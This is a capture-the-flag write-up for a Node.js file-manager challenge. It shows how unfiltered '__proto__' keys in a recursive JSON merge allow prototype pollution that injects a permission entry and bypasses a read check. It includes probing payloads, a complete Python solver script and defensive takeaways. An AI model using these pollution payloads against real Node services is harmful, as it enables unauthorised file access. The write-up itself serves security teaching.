# NodeOS

| Event | Category | Points | Flag |
|---|---|---|---|
| CSAW CTF Finals 2026 | Jail / Misc | 500 | `csaw{cust0m1z3_w3nt_4ll_th3_w4y_up}` |

**TL;DR** — A Node.js "file manager" over raw TCP whose `customize` command recursively merges
attacker JSON into a profile object without filtering `__proto__`. The `read` permission check
looks the requested path up in a plain object, so polluting `Object.prototype["/flag.txt"]` with
a correctly *shaped* entry makes the flag readable. The hard part is that the check is never
visible in any error, and a wrongly shaped entry is denied **silently** — identical output to no
payload at all.

---

## 1. Recon and the pollution primitive

The service is a line-based shell behind a pty, one fresh `node` process (v18.20.8,
`/chal/server.js`, about 131 lines) per connection.

```text
  NodeOS File Manager v0.3
  commands:
    ls <dir>          list directory
    read <path>       read a file (if you have access)
    profile           show your user profile
    customize <json>  merge settings into your profile
    help              you're looking at it
```

- `ls` has **no** access control: `ls /` shows `flag.txt`, `ls /root` works, `ls /chal` shows
  `server.js`.
- `read` is gated: `read /flag.txt` → `permission denied`.
- `profile` prints `{"name":"nodeos","uid":1000,"shell":"/bin/node","theme":"default"}`.
- `customize <json>` rejects non-objects, then merges into the profile.

Uncaught exceptions are printed to the socket **with the throwing source line**, which leaks the
merge function one line at a time:

```text
fm> customize {"a":{"b":null}}
fm> customize {"a":{"b":{"c":{"d":1}}}}
/chal/server.js:38
      if (typeof dst[key] !== 'object') dst[key] = {};
TypeError: Cannot read properties of null (reading 'c')
    at merge (/chal/server.js:38:21)
    at merge (/chal/server.js:39:7)
    at handleCommand (/chal/server.js:94:7)
    at Interface.<anonymous> (/chal/server.js:130:15)
```

Combining the leaked lines with observed behaviour, the merge is equivalent to:

```javascript
function merge(dst, src, depth = 0) {
  if (depth > 8) return;                       // observed: nesting stops after 9 levels
  for (const key in src) {                     // for...in: inherited keys are copied too
    if (src[key] && typeof src[key] === 'object' && !Array.isArray(src[key])) {
      if (typeof dst[key] !== 'object') dst[key] = {};   // line 38
      merge(dst[key], src[key], depth + 1);              // line 39
    } else {
      dst[key] = src[key];                               // line 41 (arrays assigned as-is)
    }
  }
}
```

`JSON.parse` creates `__proto__` as an ordinary own key (unlike an object literal, where it is a
setter), so `customize {"__proto__":{"k":v}}` walks into `Object.prototype` and sets `k` there.
Values are JSON data only — no functions.

---

## 2. Characterising the read check black-box

Nothing on the check's path throws, so it never leaked. It had to be probed:

- It passes for exactly `/tmp`, `/home/nodeos`, `/home/nodeos/notes.txt` and
  `/home/nodeos/welcome.txt`, **by exact string**. Trailing slashes, `//`, `/./` and `..` are all
  denied.
- It requires `profile.uid` to be the **number** `1000`. `0`, `"1000"`, `[1000]`, `-1`, `null`
  and everything else tried are denied even for the user's own files.
- It makes **no filesystem calls**. Polluting `Object.prototype.error` makes every `fs` call
  throw (Node's `handleErrorFromBinding` reads `ctx.error` off the prototype), yet allowed paths
  still clear the check and fail *later* with a different message. That difference doubles as an
  oracle for "the check passed".

So the check is an in-memory table of path → metadata. All the obvious payloads fail:

```text
customize {"__proto__":{"/flag.txt":1000}}        -> permission denied
customize {"__proto__":{"/flag.txt":true}}        -> permission denied
customize {"__proto__":{"uid":1000}}              -> permission denied
customize {"__proto__":{"/flag.txt":{"owner":1000,"type":"file","mode":511,...}}}
                                                  -> permission denied
```

### Two arguments for not giving up

At this point "the table is not reachable through the prototype" is the natural conclusion. Two
observations say otherwise:

1. **No Node-internal gadget exists on this path.** A local replica under Node 18.20.8, with
   accessors installed on `Object.prototype` for every identifier appearing in Node's own `lib/`
   sources, showed that `read`, `ls`, `console.log` and readline only fall through to the
   prototype for `errno`, `error`, `signal`, error-message fields, and stream options for the
   lazily created stderr. None of them can read a file. Polluting 41,000 names with `null` and
   again with `[]` changed behaviour only for that same handful — identically on the replica and
   on the remote. So the intended path is *not* a Node internal.
2. **The depth cap in `merge` is a tell.** A 4095-byte line cannot nest deeply enough to overflow
   the stack, so the cap is not defending against deep JSON. It is there because any
   **object-valued** key on `Object.prototype` makes a naive merge recurse forever: the freshly
   created `dst[key]` object inherits that same key from the prototype, so `merge` descends into
   itself. The author needed that cap for their *own* solution — which means the intended payload
   is an object, i.e. an injected table entry.

Given that, a silent denial means only one thing: the entry has the **wrong shape**. Injecting an
empty entry, and polluting all 41,000 names to `1000` and then to `true`, still failed — so at
least one field needs a specific non-numeric, non-boolean value.

---

## 3. Finding the shape

Rather than guessing one field at a time against a service that gives no feedback, send a single
**kitchen-sink entry** that sets every plausible field name at once, and vary the *kind of value*
per field family across attempts:

| Field family | Values tried |
|---|---|
| owner-style (`owner`, `uid`, `ownerId`, …) | `1000` |
| boolean flags (`readable`, `canRead`, `public`, …) | `true` |
| type fields (`type`, `kind`, `t`) | `"file"` |
| reader lists (`readers`, `allowedUids`, …) | `[1000]` |
| permission-style (`mode`, `perm`, `perms`, `permissions`, `rights`, `acl`, …) | cycled through `511`, `"rwxrwxrwx"`, `"r"`, `420`, `-1`, `"644"`, `"0644"`, `["r"]`, `"read"` |

This collapses a combinatorial search into nine attempts. Only the entries whose
permission-style fields held the **string `"read"`** passed:

```text
v14 key=/flag.txt | profile updated | permission denied                     (perms = ["r"])
v16 key=/flag.txt | profile updated | csaw{cust0m1z3_w3nt_4ll_th3_w4y_up}   (perms = "read", type "file")
v17 key=/flag.txt | profile updated | csaw{cust0m1z3_w3nt_4ll_th3_w4y_up}   (perms = "read", type "f")
v16 key=flag.txt  | profile updated | permission denied                     (key must be the full path)
```

---

## 4. Solver

```python
#!/usr/bin/env python3
# solve.py — NodeOS: prototype pollution injects a permission-table entry for /flag.txt.
#
# usage: python solve.py <host> [port]
import json
import socket
import sys

HOST = sys.argv[1]
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
PROMPT = b"fm> "


def entry():
    """One 'kitchen sink' table entry: every plausible field name, by value family."""
    e = {}
    for k in ["owner", "ownerUid", "owner_uid", "ownerId", "owner_id", "uid", "user", "userId",
              "euid", "gid", "group", "egid", "id", "ownedBy", "owned_by", "o", "u"]:
        e[k] = 1000  # the default profile's uid
    for k in ["readable", "read", "r", "canRead", "can_read", "allowed", "allow", "public",
              "world", "open", "access", "accessible", "visible", "shared", "exists", "isFile",
              "file", "ok", "granted", "enabled", "everyone", "all", "any", "worldReadable",
              "world_readable", "isPublic", "readonly", "readOnly"]:
        e[k] = True
    for k in ["type", "kind", "t"]:
        e[k] = "file"
    for k in ["mode", "perm", "perms", "permissions", "permission", "bits", "rights",
              "access_mode", "acl"]:
        e[k] = "read"  # the deciding value
    for k in ["readers", "users", "uids", "allowedUids", "allowed_uids", "allowedUsers",
              "members", "owners", "whitelist", "allowlist", "groups", "allowed_users",
              "readableBy", "readable_by"]:
        e[k] = [1000]
    return e


def recv_until_prompt(s):
    buf = b""
    while not buf.endswith(PROMPT):
        chunk = s.recv(65536)
        if not chunk:
            raise EOFError(buf.decode(errors="replace"))
        buf += chunk
    return buf.decode(errors="replace")


def cmd(s, line):
    s.sendall(line.encode() + b"\n")
    out = recv_until_prompt(s).replace("\r", "")
    out = out.split("\n", 1)[1] if "\n" in out else out  # drop the pty echo of our input
    return out.rsplit("fm> ", 1)[0].strip()


def main():
    payload = json.dumps({"__proto__": {"/flag.txt": entry()}}, separators=(",", ":"))
    assert len(payload) < 4095, "the pty drops lines longer than 4095 bytes"
    s = socket.create_connection((HOST, PORT), timeout=10)
    recv_until_prompt(s)  # banner
    print(cmd(s, "customize " + payload))
    print(cmd(s, "read /flag.txt"))
    s.sendall(b"\x04")  # Ctrl-D: clean EOF; an abrupt close leaves a core dump on the instance
    s.close()


if __name__ == "__main__":
    main()
```

Expected output:

```text
profile updated
csaw{cust0m1z3_w3nt_4ll_th3_w4y_up}
```

### Notes for anyone reproducing this

- **Use a fresh connection.** Pollution lasts for the life of that one process, and `for...in`
  copies inherited keys into the profile on every later `customize`, which quickly poisons your
  own state.
- The instance expired while the entry was being reduced, so the **minimal** payload is not
  known: which of the nine permission-style names the server actually reads, and whether an owner
  field matching the profile's `uid` is also required, were never isolated.
- The check itself was never leaked, so the server-side model in this writeup is inferred from
  behaviour — apart from the quoted `merge` lines, which came from real stack traces.
- The standalone script above was not re-run against a live instance after it was written; its
  payload was verified byte-for-byte against the one that printed the flag twice.

---

## Flag

```
csaw{cust0m1z3_w3nt_4ll_th3_w4y_up}
```

---

## Takeaways

- **`for...in` plus an unfiltered `__proto__` key is prototype pollution**, and `JSON.parse`
  makes `__proto__` an ordinary own property, so attacker JSON reaches it directly.
- **Permission tables held in plain objects are pollutable.** `Object.create(null)` or a `Map`
  removes this entire bug class; a plain `{}` means *every* unknown key resolves up the prototype
  chain.
- **Read the defences as hints.** The `depth > 8` cap made no sense against the stated threat and
  only made sense if object-valued prototype keys were expected — which is exactly what the
  intended payload turned out to be.
- **When the oracle is binary and silent, batch your hypotheses.** Varying value *families*
  rather than individual fields reduced an intractable guessing game to nine requests.
- **Build a local replica.** Installing accessors for every identifier in Node's `lib/` ruled out
  a whole class of Node-internal gadgets, which is what justified continuing to look for an
  application-level one.
